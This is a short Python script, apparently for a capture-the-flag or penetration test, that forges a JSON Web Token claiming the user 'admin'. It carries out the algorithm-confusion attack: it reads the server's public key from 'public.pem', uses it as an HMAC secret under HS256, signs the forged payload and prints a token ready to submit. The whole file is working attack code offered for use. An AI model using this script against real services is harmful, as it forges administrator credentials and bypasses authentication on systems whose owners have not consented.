import hmac
import hashlib
import base64

# Load the key from the 'public.pem' file
with open('public.pem', 'rb') as file:
    key = file.read()

# Paste your header and payload here
header = '{"alg":"HS256"}'
payload = '{"name":"admin"}'

# Creating encoded header
encodedHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(encodedHBytes, "utf-8").rstrip("=")

# Creating encoded payload
encodedPBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(encodedPBytes, "utf-8").rstrip("=")

# Concatenating header and payload with a period
token = (encodedHeader + "." + encodedPayload)

# Creating signature
signature = base64.urlsafe_b64encode(
    hmac.new(key, token.encode('utf-8'), hashlib.sha256).digest()
).decode('utf-8').rstrip("=")

# Combine the token and the signature with periods
jwt = token + "." + signature

print(jwt)
